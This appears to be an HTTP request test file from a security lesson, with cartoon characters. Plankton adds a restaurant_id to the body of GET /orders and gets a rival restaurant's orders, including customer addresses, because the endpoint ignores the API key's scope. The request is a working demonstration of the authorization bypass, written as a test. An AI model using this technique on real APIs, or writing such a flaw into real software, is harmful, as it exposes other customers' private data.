# @import ../common/setup.http
@host = {{base_host}}/v304

# Plankton discovers that GET /orders accepts restaurant_id in the body,
# even though the authorization only checks the API key's restaurant.

### Plankton checks his own Chum Bucket orders first
GET /orders
X-API-Key: {{chum_bucket_api_key}}

?? status == 200
?? js response.parsedBody.every(o => o.restaurant_id === 2) == true


### EXPLOIT: Plankton sends restaurant_id in the JSON body
# The API key says "Chum Bucket" but the body says "Krusty Krab"
GET /orders
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/json

{
    "restaurant_id": 1
}

?? status == 200
?? js response.parsedBody.every(o => o.restaurant_id === 1) == true


### Plankton can now see all of Krusty Krab's orders!
# Customer IDs, addresses, order totals - everything
